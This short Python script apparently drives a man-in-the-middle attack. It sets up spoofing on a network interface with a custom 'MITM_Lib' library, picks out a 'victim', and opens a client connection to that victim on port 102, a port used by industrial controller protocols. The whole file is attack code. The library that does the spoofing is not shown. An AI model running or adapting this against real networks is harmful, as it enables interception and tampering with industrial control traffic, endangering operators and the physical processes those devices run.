from MITM_Lib.Client import *

if __name__ == '__main__':
    profinet_port = 102
    mitm = MITM_conf(interface='eno1', pkt_count="100", port=str(102))
    mitm.init_spoofing()
    victim = mitm.victim
    client = Client(victim, profinet_port)
    client.start()